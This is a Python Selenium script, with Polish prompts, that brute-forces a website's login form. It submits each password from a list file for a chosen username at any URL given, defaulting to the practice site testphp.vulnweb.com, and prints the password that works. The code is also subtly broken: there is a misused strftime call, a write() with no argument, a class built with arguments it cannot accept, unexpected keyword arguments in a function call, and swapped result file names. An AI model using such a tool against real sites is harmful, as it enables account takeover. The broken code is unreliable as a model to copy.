from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.wait import WebDriverWait
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.support import expected_conditions as EC
from datetime import datetime


def get_url():
    site = input("Podaj adres strony:")
    if site == "test":
        site = "http://testphp.vulnweb.com/login.php"
    else:
        site = site
    return site


def read_list_from_file(filename):
    file_handler = open(filename + ".txt", "r")
    read_list = file_handler.readlines()
    file_handler.close()
    return read_list


def get_username():
    username = input("Podaj nazwę użytkownik:")  # test
    if username != "":
        pass
    else:
        print("Nazwa użytkownika nie może być pusta:")
    return username


def get_password_file_name():
    passfile = input("Podaj nazwę pliku haseł :")  # passw
    if passfile == "":
        passfile = "pass_list"
    else:
        passfile = passfile
    return passfile


def get_username_driver():
    username_driver = input("Podaj nazwę elmentu z nazwą użytkownika: ")
    if username_driver == "":
        username_driver = "uname"
    else:
        username_driver = username_driver
    return username_driver


def get_password_driver():
    password_driver = input("Podaj nazwę elmentu z hasłem: ")
    if password_driver == "":
        password_driver = "pass"
    else:
        password_driver = password_driver
    return password_driver


def get_submit_driver():
    return "#content > div:nth-child(1) > form > table > tbody > tr:nth-child(3) > td > input[type=submit]"


def find_correct_password(driver, passwords_list, username,cssconfig):
    correct_password = ""
    for password in passwords_list:
        driver.find_element(by=By.NAME, value=cssconfig.username_css).send_keys(username)
        driver.find_element(by=By.NAME, value=cssconfig.password_css).send_keys(password)
        driver.find_element(by=By.CSS_SELECTOR, value=cssconfig.submit_css).click()
        try:  # obsługa błedów
            WebDriverWait(driver, 2).until(EC.presence_of_element_located((By.NAME, "uname")))
        except:
            print("Correct password is ==> " + password + " <==")
            correct_password = password
    return correct_password


def save_file(password):
    test_date = datetime.now()
    test_date_file = datetime.now().strftime("2016-04-15T08:27:18-0500", "%Y-%m-%dT%H-%M-%S%z")


    if password == "":
        file_name = "ok_password" + str(test_date_file) + ".txt"
    else:
        file_name = "password_not_found" + str(test_date_file) + ".txt"

    file_write = open(file_name, "w")
    file_message = "Test date: " + str(test_date) + " \n Correct password is ==> " + password + " <=="
    file_write.write()


def main():
    url = get_url()
    username = get_username()
    password_file_name = get_password_file_name()
    username_css_locator = get_username_driver()
    password_css_locator = get_password_driver()
    submit_css_locator = get_submit_driver()
    paswords_list = read_list_from_file(password_file_name)
    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()))
    driver.get(url)
    cssconfig = CssConfig(username_css_locator, password_css_locator, submit_css_locator)

    correct_password = find_correct_password(driver=driver,
                                             passwords_list=paswords_list,
                                             username=username,
                                             cssconfig = cssconfig,

                                             username_driver=username_css_locator,
                                             password_driver=password_css_locator,
                                             cssclick=submit_css_locator)
    driver.close()
    save_file(correct_password)

class CssConfig:
    username_css = ""
    password_css = ""
    submit_css = ""